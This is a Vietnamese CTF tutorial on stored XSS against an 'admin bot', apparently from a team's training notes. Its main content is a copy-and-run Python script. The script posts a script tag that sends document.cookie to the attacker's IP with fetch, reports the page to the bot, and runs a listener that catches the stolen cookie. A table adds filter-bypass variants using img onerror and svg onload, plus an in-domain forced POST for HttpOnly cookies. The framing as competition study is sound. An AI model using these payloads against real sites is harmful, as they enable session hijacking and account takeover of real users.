# XSS + Admin Bot (mượn quyền của bot thay vì tự đăng nhập)

Bài `XSS_CSRF.md` giúp bạn xác nhận chèn được `<script>` vào trang. Nhưng tự mình mở trang bị dính XSS thì chẳng lợi gì — session chạy ra vẫn là của chính bạn. Trong CTF, cái thật sự có giá trị là: 1 chương trình tự động của ban tổ chức, gọi là **admin bot** (giống 1 trình duyệt thật, có sẵn cookie/session của "admin" hoặc nạn nhân có flag), tự mở URL bạn gửi cho nó. Nếu URL đó chứa code XSS của bạn, code sẽ chạy **trong trình duyệt của bot**, không phải của bạn — và lúc đó `document.cookie` nó đọc được là cookie thật của bot, có quyền admin. Script bạn viết khiến bot tự gửi cookie đó về cho bạn.

Khác hẳn mọi bài trước: ở đây **script của bạn không nhận flag trực tiếp trong response**. Request bạn gửi chỉ làm 2 việc (đăng payload + báo URL cho bot) — flag chỉ xuất hiện SAU đó, ở 1 server riêng do bạn tự dựng để "nghe" bot gửi về.

Trên Burp bạn nhận ra cần dùng kỹ thuật này khi: trang có ô nhập liệu hiện lại ở trang khác (bình luận, tên hồ sơ, tin nhắn) **và** có chức năng kiểu "Report to admin" / "Gửi link cho admin xem" / "Notify reviewer" — đây gần như luôn là dấu hiệu challenge muốn bạn dùng admin bot.

## Snippet copy-là-chạy

```python
import re
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

import requests

base = "http://target"
# Đổi đúng IP máy bạn NẰM TRONG MẠNG THI (không phải 127.0.0.1 -- đó là loopback
# của chính trình duyệt bot, không phải máy bạn; hỏi BTC IP đội mình trong mạng thi là gì)
MY_IP = "10.10.X.X"
MY_PORT = 8000

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")
leaked = []   # nơi lưu tạm mọi thứ bot "gửi về" cho mình


# Bước 0: dựng 1 server nhỏ để NGHE bot gửi cookie về -- không phải để trả response,
# chỉ cần ghi nhận request bot gửi tới rồi in ra
class Listener(BaseHTTPRequestHandler):
    def do_GET(self):
        leaked.append(self.path)          # self.path là toàn bộ URL bot gọi, gồm ?c=<cookie>
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args):
        pass  # tắt log mặc định của http.server cho đỡ rối màn hình


def start_listener():
    HTTPServer(("0.0.0.0", MY_PORT), Listener).serve_forever()


def solve_one(session, base_url):
    # Payload: mở trang của bot, đọc cookie, gửi về đúng listener trên -- đổi MY_IP/MY_PORT
    # thành giá trị thật trước khi gửi (f-string tự nhúng vào)
    payload = f"<script>fetch('http://{MY_IP}:{MY_PORT}/?c='+document.cookie)</script>"

    # Bước 1: đăng bình luận/nội dung chứa payload (tuỳ app -- sửa path/field cho đúng)
    r1 = session.post(f"{base_url}/comment", data={"text": payload}, timeout=5)
    if r1.status_code not in (200, 201, 302):
        return None

    # URL trang hiện bình luận vừa đăng -- đây là URL mình sẽ báo cho bot, KHÔNG phải URL /comment
    comment_url = f"{base_url}/view/latest"

    # Bước 2: báo URL này cho admin bot qua đúng chức năng "report"/"notify" của app
    r2 = session.post(f"{base_url}/report", data={"url": comment_url}, timeout=5)
    if r2.status_code not in (200, 201, 302):
        return None

    # Bước 3: CHƯA có flag ở đây -- phải chờ bot tự mở URL rồi gửi cookie về listener.
    # Đợi vài giây rồi kiểm tra biến `leaked` xem đã nhận được gì chưa.
    return "sent"  # báo đã gửi thành công; đọc flag thật ở phần dưới


if __name__ == "__main__":
    threading.Thread(target=start_listener, daemon=True).start()  # chạy listener nền, không chặn code sau

    s = requests.Session()
    s.verify = False
    status = solve_one(s, base)
    print("Đã gửi báo cáo cho bot:", status)

    time.sleep(10)  # chờ bot kịp mở link và gửi cookie về -- tuỳ app, có thể cần lâu hơn
    print("Dữ liệu listener nhận được:", leaked)
    for path in leaked:
        m = FLAG_RE.search(path)
        if m:
            print("FLAG:", m.group(0))
```

## Giải thích cho người mới

- **Vì sao cần `threading`**: listener (`HTTPServer(...).serve_forever()`) chạy vô thời hạn, nếu gọi trực tiếp code sẽ "đứng" ở đó mãi, không chạy tiếp được các bước gửi request. `threading.Thread(..., daemon=True).start()` cho listener chạy "nền" (song song), code chính vẫn tiếp tục chạy bước 1-2-3 ngay sau đó. `daemon=True` để khi script chính kết thúc, thread nền cũng tự tắt theo, không phải tự `Ctrl+C`.
- **`self.path` trong `Listener`**: khi bot gọi `fetch('http://MY_IP:8000/?c=' + document.cookie)`, request đó đến đúng server nhỏ bạn vừa dựng, và `self.path` sẽ là `/?c=session=abc123...` — chính là cookie thật của bot, đọc được ngay không cần làm gì thêm.
- **`time.sleep(10)` ở cuối**: bot không mở URL ngay lập tức, cần chờ 1 khoảng (tuỳ hệ thống, có thể vài giây tới cả phút) — đây là lý do bài này **khác hẳn** các bài trước: không thể đọc flag ngay trong response của `requests.post(...)`, phải chủ động đợi rồi kiểm tra lại biến `leaked`.
- Nếu field `"text"` ở bước 1 hoặc path `/comment`, `/report` không đúng với app thật — đây chỉ là tên mẫu, phải đổi theo đúng tên field/path bạn thấy trong Burp khi tự đăng bình luận và tự bấm nút report bằng tay trước.

## Né khi bị chặn `<script>` hoặc có CSP

| Tình huống | Đổi payload thành |
|---|---|
| Thẻ `<script>` bị lọc | `<img src=x onerror="fetch('http://MY_IP:8000/?c='+document.cookie)">` |
| Cả `img`/`onerror` cũng bị lọc | `<svg onload="fetch('http://MY_IP:8000/?c='+document.cookie)">` |
| Cookie có cờ `HttpOnly` (JS không đọc được `document.cookie`) | Đừng cố đọc cookie — cho bot **tự làm hộ 1 hành động** ngay trong domain, ví dụ `<script>fetch('/admin/action',{method:'POST',credentials:'include'})</script>` (trình duyệt tự gửi kèm cookie dù JS không đọc được giá trị) |
| Có header `Content-Security-Policy: connect-src 'self'` (chặn `fetch()` ra ngoài domain) | Không gửi dữ liệu ra ngoài được nữa — đổi sang cách trên: cho bot tự thực hiện 1 hành động công khai hoá flag ngay trong domain, rồi bạn đọc lại bằng request bình thường, không cần XSS nữa |

Nếu payload bị lọc theo kiểu phức tạp hơn (viết hoa/thường, double-tag...), xem [`XSS_Filter_CSP_Bypass.md`](XSS_Filter_CSP_Bypass.md).

## Lưu ý nhanh

- Luôn tự mở lại trang bằng **trình duyệt thật** (không chỉ nhìn HTML thô trong Burp) để xác nhận `alert(1)` thật sự chạy, trước khi đổi sang payload thật gửi cho bot — Burp không tự thực thi JavaScript.
- Listener **phải chạy trên máy/IP nằm trong mạng thi đấu** — dùng `127.0.0.1` sẽ không nhận được gì, vì đó là loopback của chính trình duyệt bot, không phải máy bạn.
- Nếu đợi lâu không thấy `leaked` có gì: kiểm tra lại đúng field/path report, hỏi xem bot có route mạng tới IP đội mình không (có thể bị tường lửa giữa các đội chặn), và thử tự mở URL report bằng trình duyệt thật xem bot có thật sự "ăn" được link đó không.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
